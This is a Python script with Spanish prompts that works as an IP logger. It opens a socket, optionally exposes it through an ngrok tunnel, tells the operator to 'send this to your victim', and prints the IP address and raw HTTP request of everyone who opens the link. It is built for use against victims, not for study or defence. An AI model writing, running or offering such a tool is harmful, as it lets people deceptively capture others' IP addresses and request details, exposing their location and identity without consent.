import socket
import time
import subprocess
import os
import sys
def ip():

    HOST, PORT = str(input("host: ")), int(input("port: "))
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_socket.bind((HOST, PORT))
    listen_socket.listen(5)

    cantidad = 5

    while cantidad < 6:
        time.sleep(1)
        os.system("clear")
        print("Espera un momento |")
        time.sleep(1)
        os.system("clear")
        print("Espera un momento /")
        time.sleep(1)
        os.system("clear")
        print("Espera un momento -")
        time.sleep(1)
        os.system("clear")
        print("Espera un momento \ ")
        os.system("clear")
        print("Esperando un momento :)")
        print("\n")
        cantidad = cantidad + 1

    seleccion = str(input("""
    Selecciona el tipo de tunel:

    01)Ngrok
    02)Local
    03)Descargar Ngrok
    : """))

    if seleccion == "01" or seleccion == "1":
        
        os.system("./ngrok http {0}:{1} > /dev/null &".format(HOST, PORT))
        time.sleep(10)
        print("Envia esto a tu victima: ")
        print(str(os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n")))
    if seleccion == "02" or seleccion == "2":
        print("Envia esto a tu victima:{0}:{1}\n".format(HOST, PORT))
    if seleccion == "03" or seleccion == "3":
        print("\nespera un minuto, esto puede tardar debido a tu conexion\n")
        os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1")
        os.system("unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1")
        os.system("rm -rf ngrok-stable-linux-arm.zip")
    if os.path.exists("ngrok"):
        os.system("chmod +x ngrok")
        print("se ha descargado con exito!\nvuelve a entrar")
        sys.exit()
        


        
    while True:
        conexion, addr = listen_socket.accept() 
        print("[*]IP Logged!" + (str(addr)))
        request = conexion.recv(1024)
        print(request.decode('utf-8'))


        http_response = """
        HTTP/1.1 200 OK

        This is a logger

        """

        conexion.sendall(bytes(http_response,'utf-8'))
        conexion.close()

